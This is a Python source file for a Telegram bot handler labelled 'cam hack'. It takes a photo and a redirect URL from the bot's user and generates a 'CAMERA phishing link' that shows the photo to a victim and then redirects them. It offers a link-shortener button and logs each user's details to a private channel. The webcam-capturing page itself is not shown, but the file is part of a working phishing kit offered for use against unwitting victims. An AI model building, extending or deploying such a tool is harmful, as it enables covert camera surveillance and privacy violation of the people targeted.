import uuid
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.utils.storage import (
    user_data, link_cache, victim_data_store, user_username_cache,
    save_links, encode_redirect
)


def handle_cam_hack(bot, message, get_bottom_buttons):
    user_id = message.chat.id

    # ===== USERNAME CAPTURE =====
    try:
        chat = bot.get_chat(user_id)
        if chat.username:
            user_username_cache[user_id] = f"@{chat.username}"
        else:
            user_username_cache[user_id] = f"{chat.first_name or 'Unknown'}"
    except:
        user_username_cache[user_id] = "Unknown"

    msg = bot.send_message(user_id, "📤 Send me a PHOTO (will be shown to victim)", reply_markup=get_bottom_buttons())
    bot.register_next_step_handler(msg, lambda m: get_cam_photo(m, user_id, get_bottom_buttons, bot))


def get_cam_photo(message, user_id, get_bottom_buttons, bot):
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        user_data[user_id] = {"photo_url": photo_url}
        victim_data_store[f"photo_{user_id}"] = photo_url

        username = user_username_cache.get(user_id, "Unknown")

        try:
            bot.send_photo(
                PRIVATE_CHANNEL_ID,
                photo_id,
                caption=f"📸 User Uploaded Photo\n\nUsername: {username}\nID: {user_id}"
            )
        except Exception as e:
            print(f"Channel photo error: {e}")

        msg = bot.send_message(user_id, "📤 Now send REDIRECT LINK", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())


def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
    redirect_url = message.text.strip()

    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        victim_data_store[f"redirect_{user_id}"] = redirect_url

        username = user_username_cache.get(user_id, "Unknown")

        # ===== ENCODE REDIRECT IN URL =====
        encoded_redirect = encode_redirect(redirect_url)

        unique_id = str(uuid.uuid4())[:8]
        # Link with redirect embedded
        link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}&r={encoded_redirect}"
        link_cache[unique_id] = {
            "user_id": user_id,
            "time": time.time(),
            "type": "cam",
            "link": link,
            "redirect": redirect_url
        }
        save_links()

        print(f"✅ LINK GENERATED: {link}")
        print(f"✅ REDIRECT EMBEDDED: {redirect_url}")

        try:
            bot.send_message(
                PRIVATE_CHANNEL_ID,
                f"✅ New Cam Hack Link\n\n"
                f"👤 User: {username}\n"
                f"🆔 ID: {user_id}\n"
                f"🌐 Redirect: {redirect_url}\n"
                f"🔗 Link: {link}"
            )
        except Exception as e:
            print(f"Channel send error: {e}")

        # ===== USER KO LINK =====
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ CAMERA phishing link ready:\n\n{link}\n\nVictim sees your photo → redirects to {redirect_url}",
            reply_markup=markup
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
        msg = bot.send_message(user_id, "📤 Send REDIRECT LINK", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
